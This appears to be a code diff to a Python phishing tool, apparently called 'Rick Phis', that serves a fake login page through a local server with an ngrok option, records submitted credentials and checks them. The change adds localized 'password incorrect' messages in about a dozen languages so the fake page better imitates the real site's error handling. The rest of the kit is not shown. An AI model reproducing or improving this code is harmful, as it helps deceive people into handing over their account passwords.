@@ -180,18 +180,44 @@ def main():
             headless_mode = args.headless
 
             web_site = language_mapping.get(lang.lower())
+            language_code = web_site.split(path_separator)[1]
+            if language_code.startswith("ar"):
+                error_message = "عذرًا، كلمة المرور غير صحيحة. يرجى التحقق مرة أخرى."
+            elif language_code.startswith("az"):
+                error_message = "Təsüfki, şifrə yanlışdır. Zəhmət olmasa parolunuzu yenidən yoxlayın."
+            elif language_code.startswith("ch"):
+                error_message = "抱歉，您的密码不正确。请再次检查您的密码。"
+            elif language_code.startswith("de"):
+                error_message = "Entschuldigung, Ihr Passwort war falsch. Bitte überprüfen Sie Ihr Passwort."
+            elif language_code.startswith("es"):
+                error_message = "Lo siento, su contraseña no es correcta. Por favor, verifique su contraseña."
+            elif language_code.startswith("fr"):
+                error_message = "Désolé, votre mot de passe est incorrect. Veuillez vérifier votre mot de passe."
+            elif language_code.startswith("index"):
+                error_message = "Sorry, your password was incorrect. Please double-check your password."
+            elif language_code.startswith("it"):
+                error_message = "Spiacenti, la password inserita non è corretta. Si prega di controllare nuovamente la password."
+            elif language_code.startswith("ko"):
+                error_message = "죄송합니다. 비밀번호가 잘못되었습니다. 비밀번호를 다시 확인해주세요."
+            elif language_code.startswith("ru"):
+                error_message = "Извините, ваш пароль неверен. Пожалуйста, проверьте свой пароль."
+            elif language_code.startswith("tr"):
+                error_message = "Üzgünüz, şifreniz yanlış. Lütfen şifrenizi kontrol edin."
+            else:
+                error_message = "Sorry, your password was incorrect. Please double-check your password."
+
             if not web_site:
                 print(Fore.RED + "Invalid language code!")
                 continue
             if chosen == 1:
-                start_server(web_site, port, output_file, redirect_location, check_login, ngrok_token, headless_mode)
+                start_server(web_site, port, output_file, redirect_location, check_login, ngrok_token, headless_mode,error_message)
             else:
                 print(f"Site {chosen} is under development. Coming soon!")
 
     except KeyboardInterrupt:
         print(Fore.YELLOW, "\nRick Phis was stopped (ctrl+c)", Fore.RESET)
 
-def start_server(web_site, port, output_file, redirect_location, check_login, ngrok_token, headless_mode):
+def start_server(web_site, port, output_file, redirect_location, check_login, ngrok_token, headless_mode,error_message):
     class MyHTTPRequestHandler(BaseHTTPRequestHandler):
         def do_GET(self):
             file_path = self.path.strip('/')
@@ -251,7 +277,7 @@ def start_server(web_site, port, output_file, redirect_location, check_login, ng
                     response['redirect'] = redirect_location
                 else:
                     response['status'] = 'error'
-                    response['error_msg'] = 'Login failed! The username or password is incorrect.'
+                    response['error_msg'] = error_message
                 
                 self.send_response(200)
                 self.send_header('Content-type', 'application/json')
